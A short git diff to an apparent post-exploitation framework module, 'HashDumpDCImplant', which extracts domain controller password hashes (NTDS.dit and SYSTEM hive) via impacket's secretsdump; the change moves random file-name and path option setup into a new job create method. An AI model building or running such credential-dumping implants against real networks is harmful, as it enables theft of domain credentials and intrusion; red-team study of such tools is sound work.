@@ -23,7 +23,6 @@ class HashDumpDCImplant(core.implant.Implant):
         return HashDumpDCJob
 
     def run(self):
-
         import os.path
         import os
         if not os.path.isfile("data/impacket/examples/secretsdump.py"):
@@ -52,17 +51,16 @@ class HashDumpDCImplant(core.implant.Implant):
                 self.shell.prompt = old_prompt
                 self.shell.clean_prompt = old_clean_prompt
 
-        # generate new file every time this is run
-        self.options.set("NTDSFILE", uuid.uuid4().hex)
-        self.options.set("SYSHFILE", uuid.uuid4().hex)
-        self.options.set("RPATH", self.options.get('RPATH').replace("\\", "\\\\").replace('"', '\\"'))
-
         payloads = {}
-        payloads["js"] = self.loader.load_script("data/implant/gather/hashdump_dc.js", self.options)
+        payloads["js"] = "data/implant/gather/hashdump_dc.js"
 
         self.dispatch(payloads, self.job)
 
 class HashDumpDCJob(core.job.Job):
+    def create(self):
+        self.options.set("NTDSFILE", uuid.uuid4().hex)
+        self.options.set("SYSHFILE", uuid.uuid4().hex)
+        self.options.set("RPATH", self.options.get('RPATH').replace("\\", "\\\\").replace('"', '\\"'))
 
     def save_file(self, data, name, encoder, decode = True):
         import uuid
